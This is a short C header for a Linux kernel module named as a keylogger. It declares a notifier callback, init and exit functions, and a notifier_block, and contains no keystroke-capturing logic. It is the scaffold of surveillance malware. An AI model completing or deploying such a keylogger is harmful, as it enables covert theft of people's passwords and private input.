#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/notifier.h>   // For notifier_block struct

// Function declarations for the keylogger module
static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data);
static int __init keylogger_init(void);
static void __exit keylogger_exit(void);

// Structure for the notifier block
static struct notifier_block keylogger_nb = {
        .notifier_call = keylogger_notifier
};

#endif // KEYLOGGER_H
